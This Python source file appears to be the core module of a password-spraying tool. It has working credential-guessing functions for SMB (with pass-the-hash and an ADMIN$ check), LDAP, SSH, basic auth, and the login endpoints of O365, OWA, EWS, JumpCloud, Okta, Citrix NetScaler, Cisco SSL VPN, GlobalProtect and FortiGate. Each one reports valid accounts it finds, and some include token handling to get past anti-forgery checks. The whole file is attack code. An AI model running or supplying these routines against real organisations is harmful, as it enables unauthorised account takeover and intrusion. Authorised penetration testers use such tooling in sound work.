#!/usr/bin/env python3

# Import all the libraries for the different prtocols
from impacket.smbconnection import SMBConnection, SessionError
import ldap3
import paramiko
from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM
from socket import error as socket_error
import requests, sys, warnings
from requests.exceptions import ConnectionError
from requests_ntlm import HttpNtlmAuth
# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder
from exchangelib.errors import UnauthorizedError, CASError

warnings.simplefilter('ignore',InsecureRequestWarning)

'''This is the function to check the username and password for smb connections.
made use of impacket for the SMBv3 setup and got ideas from the excellent wmiexec and
crackmapexec for implementation'''
def smb_conn(params):
	
	username = params.get("username")
	password = params.get("password")
	host = params.get("host")
	count = params.get("count")
	ptype = params.get("password_type")
	place = params.get("place")
	server = host
			
	try:
			
		connection_name = SMBConnection(server,server) #create connection
		try:
			connection_name.login('','')
		except:
			pass

		if params.get("localauth") == 'True':
			domain = connection_name.getServerName()
		elif params.get("domain"):
			domain = params.get("domain")
		else:
			domain = connection_name.getServerDomain()
		connection_name.logoff()	

		connection = SMBConnection(server,server)
        #print the host , username and password being checked
		print ("ACCOUNT CHECK: [SMB] Host: {} Domain: {} User: {} [{} of {}, {} completed] Password: {}".format(server,domain,username,place ,count,place,password))

		if ptype == "plaintext":
			login_true = connection.login(username,password,domain) #check if login works
		else:
			lmhash = 'aad3b435b51404eeaad3b435b51404ee'
			login_true = connection.login(username,'',domain,lmhash,password)
		admin_check = connection.connectTree('ADMIN$') #check if admin access is possible
				
		#check if login works and if admin access is possible and print out results
		if (login_true == True and admin_check == 1):
			print ("ACCOUNT FOUND: [SMB] Host: {} Domain: {} User: {} Password: {} [SUCCESS - (Admin$ Access Allowed)]".format(server,domain,username,password))
			return "ACCOUNT FOUND: [SMB] Host: {} Domain: {} User: {} Password: {} [SUCCESS - (Admin$ Access Allowed)]".format(server,domain,username,password)

		connection.logoff()

	#Check what the Error is 
	except socket_error as msg:
		print("Error: {}".format(msg))
		pass
	except SessionError as e:
		if 'STATUS_LOGON_FAILURE' in e.getErrorString():
			pass

		elif "STATUS_ACCESS_DENIED" in e.getErrorString():
			
			if login_true == True:
				print ("ACCOUNT FOUND: [SMB] Host: {} Domain: {} User: {} Password: {} [SUCCESS - ({})]".format(server,domain,username,password,e.getErrorString()[0]))
				return "ACCOUNT FOUND: [SMB] Host: {} Domain: {} User: {} Password: {} [SUCCESS - ({})]".format(server,domain,username,password,e.getErrorString()[0])
		else:
			print ("ACCOUNT FOUND: [SMB] Host: {} Domain: {} User: {} Password: {} [SUCCESS - ({})]".format(server,domain,username,password,e.getErrorString()[0]))
			return "ACCOUNT FOUND: [SMB] Host: {} Domain: {} User: {} Password: {} [SUCCESS - ({})]".format(server,domain,username,password,e.getErrorString()[0])

'''Function for checking credentials against ldap. This can take a port value but have not
implemented that yet. A future to be done feature. Took ideas to implement from ldapdomaindump'''
def ldap_conn(params):

    auth = params.get("authentication")
    username = params.get("username")
    password = params.get("password")
    host = params.get("host")
    server = Server(host, get_info=ALL)
    count = params.get("count")
    domain = params.get("ldapdomain")
    username = domain + '\\' + username
    place = params.get("place")
            
    try:

        # print the host , username and password being checked
        print ("ACCOUNT CHECK: [LDAP] Host: {} Domain: {} User: {} [{} of {}, {} completed] Password: {}".format(host,domain,username,place ,count,place,password))

        connection =  Connection(server, username, password,authentication=auth)#create connection
        if connection.bind():
            print ("ACCOUNT FOUND: [LDAP] Host: {} Domain: {} User: {} Password: {} [SUCCESS]".format(host,domain,username,password))
            return "ACCOUNT FOUND: [LDAP] Host: {} Domain: {} User: {} Password: {} [SUCCESS]".format(host,domain,username,password)
    
    except:
        print(connection.result)

'''Function to password guess against jumpcloud console. Completely stole the idea from
dru1d and stumblebot'''
def jump_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    jmpurl = ''.join(params.get("host"))
    target = 'console.jumpcloud.com'
    xsrf = params.get('xsrf')
    xsrftoken = params.get('xsrftoken')
    # xsrf,xsrftoken = get_tokens()

    headers = {
        'Host': 'console.jumpcloud.com',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Geckopplication/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json',
        'X-Xsrftoken': xsrftoken,
        'Content-Length': '61',
        'Origin': 'https://console.jumpcloud.com',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://console.jumpcloud.com/login',
    }

    cookies = {'jc_prevLoginType': 'user',
               '_xsrf': xsrf}
    data = {'email': username, 'password': password}
    try:

        # print the host , username and password being checked
        print("ACCOUNT CHECK: [JumpCloud] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            target, username, place, count, place, password))

        query = requests.post(
            jmpurl, json=data, headers=headers, cookies=cookies, verify=False)
        if query.status_code == 200:
            print("ACCOUNT FOUND: [JumpCloud] Target: {} User: {} Password: {} [SUCCESS]".format(
                target, username, password))
            return"ACCOUNT FOUND: [JumpCloud] Target: {} User: {} Password: {} [SUCCESS]".format(target, username, password)
        elif query.status_code != 401:
            print("The Header Respose code to investigate: {}".format(
                query.status_code))

    except:
        pass

'''Need to run this function once before spraying jumpcloud to get the xsrf token values.
Without these values a 403 is returned'''
def get_tokens():

    tokenurl = 'https://console.jumpcloud.com/userconsole/xsrf'

    tokenreq = requests.get(tokenurl)
    cookieparse = vars(tokenreq.cookies)
    xsrfconv = vars(cookieparse['_cookies']
                    ['console.jumpcloud.com']['/']['_xsrf'])
    xsrf = xsrfconv['value']
    xsrftoken = tokenreq.text.split('"')[3]

    return xsrf, xsrftoken

'''Function to password guess against o365 using the autodiscover endpoint.
Maybe will implement a method to guess against EWS endpoint'''
def o365_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    owaurl = ''.join(params.get("host"))
    target = owaurl.split('/')
    print (owaurl)

    try:

        # print the host , username and password being checked
        print("ACCOUNT CHECK: [O365] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            target[2], username, place, count, place, password))

        headers = {"Content-Type": "text/xml"}
        query = requests.get(owaurl, auth=(username, password), verify=False, headers=headers)
        if query.status_code == 200:
            print("ACCOUNT FOUND: [O365] Target: {} User: {} Password: {} [SUCCESS]".format(
                target[2], username, password))
            return"ACCOUNT FOUND: [O365] Target: {} User: {} Password: {} [SUCCESS]".format(target[2], username, password)
        elif query.status_code == 456:
            print("ACCOUNT FOUND: [O365] Target: {} User: {} Password: {} [SUCCESS - MFA Enabled]".format(
                target[2], username, password))
            return"ACCOUNT FOUND: [O365] Target: {} User: {} Password: {} [SUCCESS - MFA Enabled]".format(target[2], username, password)
        else:
            print("The Header Respose code to investigate: {}".format(query.status_code))
	
    except:
        pass

'''Function to password spray against on-prem owa portal.
Targets autodiscover service to validate credentials'''
def owa_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    owa = ''.join(params.get("host"))
    owaurl = 'https://' + owa + '/autodiscover/autodiscover.xml'
    target = owa.split('/')

    try:
        # print the host , username and password being checked
        print("ACCOUNT CHECK: [OWA] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            target[0], username, place, count, place, password))

        headers = {"Content-Type": "text/xml"}
        query = requests.get(owaurl, auth=HttpNtlmAuth(username, password), verify=False, headers=headers)
        if query.status_code == 200:
            print("ACCOUNT FOUND: [OWA] Target: {} User: {} Password: {} [SUCCESS]".format(
            target[0], username, password))
            return"ACCOUNT FOUND: [OWA] Target: {} User: {} Password: {} [SUCCESS]".format(target[0], username, password)
        elif query.status_code == 401:
            pass
        else:
            print("The Header Respose code to investigate: {}".format(query.status_code))
	
    except:
        pass

'''Function for password spraying against Netscaler portal'''
def citrix_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    citrixurl = ''.join(params.get("host"))
    originurl = 'https://' + citrixurl
    citrixendpt = 'https://' + citrixurl + '/vpn/index.html'
    posturl = 'https://' + citrixurl + '/cgi/login'

    headers = {
        'Host': citrixurl,
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '64',
        'Origin': originurl,
        'DNT': '1',
        'Connection': 'close',
        'Referer': citrixendpt,
        'Upgrade-Insecure-Requests': '1'
    }

    data = "login={}&dummy_username=&dummy_pass1=&passwd={}".format(username,password)
    try:

        # print the host , username and password being checked
        print("ACCOUNT CHECK: [Citrix] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            citrixurl, username, place, count, place, password))

        query = requests.post(
            posturl, data=data, headers=headers, allow_redirects=True)
        for resp in query.history:
            if resp.status_code == 302:
                if resp.headers['Location'] == '/cgi/setclient?cvpn':
                    print("ACCOUNT FOUND: [Citrix] Target: {} User: {} Password: {} [SUCCESS]".format(
                        citrixurl, username, password))
                    return"ACCOUNT FOUND: [Citrix] Target: {} User: {} Password: {} [SUCCESS]".format(citrixurl, username, password)
            elif query.status_code != 401:
                print("The Header Respose code to investigate: {}".format(
                    query.status_code))

    except:
        pass

'''This function enables password spraying against Cisco SSLVPN.
It has functionality for both group list and non group list portal.'''
def cisco_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    ciscourl = ''.join(params.get("host"))
    ciscoendpt = ciscourl + '/+CSCOE+/logon.html?a0=15&a1=&a2=&a3=1'
    posturl = ciscourl + '/+webvpn+/index.html'
    hosturl = ciscourl.strip('/')[1]
    group = params.get('group')

    headers = {
        'Host': hosturl,
        'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '99',
        'Origin': ciscourl,
        'DNT': '1',
        'Connection': 'close',
        'Referer': ciscoendpt,
        'Cookie': 'webvpnlogin=1; webvpnLang=en',
        'Upgrade-Insecure-Requests':'1'
    }
    if group != 'None':
        data = 'tgroup=&next=&tgcookieset=&group_list={}&username={}&password={}&Login=Login'.format(group,username,password)
    else:
        data = 'tgroup=&next=&tgcookieset=&username={}&password={}&Login=Login'.format(username,password)
    try:

        # print the host , username and password being checked
        print("ACCOUNT CHECK: [Cisco] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            ciscourl, username, place, count, place, password))

        query = requests.post(
            posturl, json=data, headers=headers, verify=False)
        #print (type(query.headers['Set-Cookie'])
        if query.status_code == 200:
            if 'webvpn=;' not in query.headers['Set-Cookie']:
                print("ACCOUNT FOUND: [Cisco] Target: {} User: {} Password: {} [SUCCESS]".format(
                    ciscourl, username, password))
                return"ACCOUNT FOUND: [Cisco] Target: {} User: {} Password: {} [SUCCESS]".format(ciscourl, username, password)
        elif query.status_code != 401:
            print("The Header Respose code to investigate: {}".format(
                query.status_code))

    except:
        pass
'''Function to password guess against SSH.
Will need to move the client object outside the loop for faster execution'''
def ssh_conn(params):

    username = params.get("username")
    password = params.get("password")
    host = params.get("host")
    count = params.get("count")
    place = params.get("place")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:

        # print the host , username and password being checked
        print("ACCOUNT CHECK: [SSH] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            host, username, place, count, place, password))
        client.connect(hostname=host, username=username, password=password, timeout=3)

    except paramiko.AuthenticationException:
        pass
    except paramiko.SSHException:
        print ("Anti-Brute measures triggered")
    else:
        print("ACCOUNT FOUND: [SSH] Target: {} User: {} Password: {} [SUCCESS]".format(
                host, username, password))
        return"ACCOUNT FOUND: [SSH] Target: {} User: {} Password: {} [SUCCESS]".format(host, username, password)

'''Function to spray okta portal'''
def okta_conn(params):

    username = params.get("username")
    password = params.get("password")
    #host = params.get("host")
    count = params.get("count")
    place = params.get("place")
    domain = params.get("host")
    oktadomain = domain + ".okta.com"
    originreferrer = 'https://' + oktadomain
    oktaurl = "https://{}/api/v1/authn".format(oktadomain)

    headers = {
        'Host': oktadomain,
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0',
        'Accept': 'application/json',
        'Accept-Language': 'en',
        'Accept-Encoding': 'gzip, deflate',
        'content-type': 'application/json',
        'x-okta-user-agent-extended': 'okta-signin-widget-4.1.2',
        'Content-Length': '212',
        'Origin': originreferrer,
        'Connection': 'close',
        'Referer': originreferrer
    }
    data = {"username":"{}".format(username),"options":{"warnBeforePasswordExpired":"true","multiOptionalFactorEnroll":"true"},"password":"{}".format(password)}

    try:

        # print the host , username and password being checked
        print("ACCOUNT CHECK: [OKTA] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            oktadomain, username, place, count, place, password))
        query = requests.post(oktaurl,json=data,headers=headers)

        #print(query.status_code)
        if query.status_code == 200:
            print("ACCOUNT FOUND: [OKTA] Target: {} User: {} Password: {} [SUCCESS]".format(
                oktadomain, username, password))
            return"ACCOUNT FOUND: [OKTA] Target: {} User: {} Password: {} [SUCCESS]".format(oktadomain, username, password)
    
    except:
        pass
'''Function to spray any page using basic auth prompt.
Will not work with anything that uses NTLM auth'''
def basic_conn(params):

    username = params.get("username")
    password = params.get("password")
    host = params.get("host")
    count = params.get("count")
    place = params.get("place")
    ssl = params.get("ssl")
    directory = params.get("directory")

    if ssl:
        basicurl = 'https' + host
    else:
        basicurl = 'http' + host

    urldir = basicurl + '/' + directory

    headers = {
        'Host': host,
        'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Referer': basicurl,
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:

        # print the host , username and password being checked
        print("ACCOUNT CHECK: [BASICAUTH] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            host, username, place, count, place, password))
        query = requests.get(urldir,auth=(username, password),verify=False, headers=headers)

        if query.status_code == 200:
            print("ACCOUNT FOUND: [BASICAUTH] Target: {} User: {} Password: {} [SUCCESS]".format(
                host, username, password))
            return"ACCOUNT FOUND: [BASICAUTH] Target: {} User: {} Password: {} [SUCCESS]".format(host, username, password)
    
    except:
        pass

def gp_conn(params):

    username = params.get("username")
    password = params.get("password")
    host = params.get("host")
    count = params.get("count")
    place = params.get("place")
    origin = 'https://' + host
    gpurl = "https://{}/global-protect/login.esp".format(host)

    headers = {
        'Host': host,
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '149',
        'Origin': origin,
        'DNT': '1',
        'Connection': 'close',
        'Referer' : gpurl,
        'Cookie': 'PHPSESSID=f7d08e4f708432cc978e782fcd710f8d',
        'Upgrade-Insecure-Requests': '1'
    }

    data = "prot=https:&server={}&action=getsoftware&user={}&passwd={}&ok=Log+In".format(host,username,password)

    try:

        # print the host , username and password being checked
        print("ACCOUNT CHECK: [GLOBALPROTECT] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            host, username, place, count, place, password))
        query = requests.post(gpurl,data=data,headers=headers, verify=False, allow_redirects=True)
        for resp in query.history:
            if resp.headers['Location'] == '/global-protect/getsoftwarepage.esp':
                print("ACCOUNT FOUND: [GLOBALPROTECT] Target: {} User: {} Password: {} [SUCCESS]".format(
                    host, username, password))
                return"ACCOUNT FOUND: [GLOBALPROTECT] Target: {} User: {} Password: {} [SUCCESS]".format(host, username, password)
    except:
        pass


def fortigate_conn(params):

    username = params.get("username")
    password = params.get("password")
    host = params.get("host")
    count = params.get("count")
    place = params.get("place")
    origin = 'https://' + host
    fortiurl = "https://{}/remote/login?lang=en".format(host)
    loginurl = "https://{}/remote/logincheck".format(host)

    headers = {
        'Host': host,
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'If-Modified-Since': 'Sat, 1 Jan 2000 00:00:00 GMT',
        'Content-Type': 'text/plain;charset=UTF-8',
        'Content-Length': '52',
        'Origin': origin,
        'Connection': 'close',
        'Referer': fortiurl
    }

    data = "ajax=1&username={}&realm=&credential={}".format(username,password)

    try:

        # print the host , username and password being checked
        print("ACCOUNT CHECK: [FORTIGATE] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            host, username, place, count, place, password))
        query = requests.post(loginurl,data=data,headers=headers, verify=False, allow_redirects=True)
        if query.status_code == 200:
            if 'SVPNTMPCOOKIE' in query.headers['Set-Cookie']:
                print("ACCOUNT FOUND: [FORTIGATE] Target: {} User: {} Password: {} [SUCCESS]".format(
                    host, username, password))
                return"ACCOUNT FOUND: [FORTIGATE] Target: {} User: {} Password: {} [SUCCESS]".format(host, username, password)
    except:
        pass    

def ews_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    domain = params.get("domain")
    owa = ''.join(params.get("host"))
    target = owa.split('/')

    try:
        # print the host , username and password being checked
        print("ACCOUNT CHECK: [EWS] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            target[0], username, place, count, place, password))
        account, config = ews_config_setup(username, password, domain, owa)

        if account is not None and config is not None:
            print("ACCOUNT FOUND: [EWS] Target: {} User: {} Password: {} [SUCCESS]".format(
            target[0], username, password))
            return"ACCOUNT FOUND: [EWS] Target: {} User: {} Password: {} [SUCCESS]".format(target[0], username, password)
        else:
            pass
	
    except:
        pass

def ews_config_setup(user, password, domain,serverurl):

    try:
        config = Configuration(
            server=serverurl,
            credentials=Credentials(
                username="{}@{}".format(user, domain),
                password=password))

        account = Account(
            primary_smtp_address="{}@{}".format(user, domain),
            autodiscover=False,
            config=config,
            access_type=DELEGATE)

    except UnauthorizedError:
        #print("Bad password")
        return None, None

    except CASError:
        #print("CAS Error: User {} does not exist.".format(user))
        return None, None

    return account, config